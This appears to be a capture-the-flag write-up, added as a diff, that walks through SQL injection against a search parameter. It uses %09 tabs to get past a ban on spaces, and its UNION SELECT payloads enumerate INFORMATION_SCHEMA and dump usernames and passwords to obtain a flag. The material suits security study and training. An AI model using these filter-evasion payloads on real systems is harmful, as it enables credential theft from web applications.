@@ -1,0 +1,28 @@
+Well now the challenge is disallowing space characters...
+
+This is becoming more and more simple
+SQL doesn't care about spaces, it also accepts \t and \n
+So let's just look up the URL encoding table for the value of \t
+And use it as a whitespace
+
+?q='%09OR''%3D'
+Works just fine, let's check the union again
+?q='UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'
+Returns full results
+
+?q=a'UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a
+Returns no results
+
+Meaning it works like a charm, let's proceed
+
+a'UNION SELECT column_name AS title, table_name AS link, data_type AS description FROM INFORMATION_SCHEMA.COLUMNS UNION SELECT * FROM search_engine WHERE ''='a
+Becomes
+a'UNION%09SELECT%09column_name%09AS%09title,%09table_name%09AS%09link,%09data_type%09AS%09description%09FROM%09INFORMATION_SCHEMA.COLUMNS%09UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a
+
+Same layout as previous two levels, let's just
+a'UNION%09SELECT%09username%09AS%09title,%09password%09AS%09link,%09password%09AS%09description%09FROM%09users%09UNION%09SELECT%09*%09FROM%09search_engine%09WHERE%09''%3D'a
+
+Administrator
+FLAG-26184a4137f2d771dba7cf239fc064e5
+
+Voila
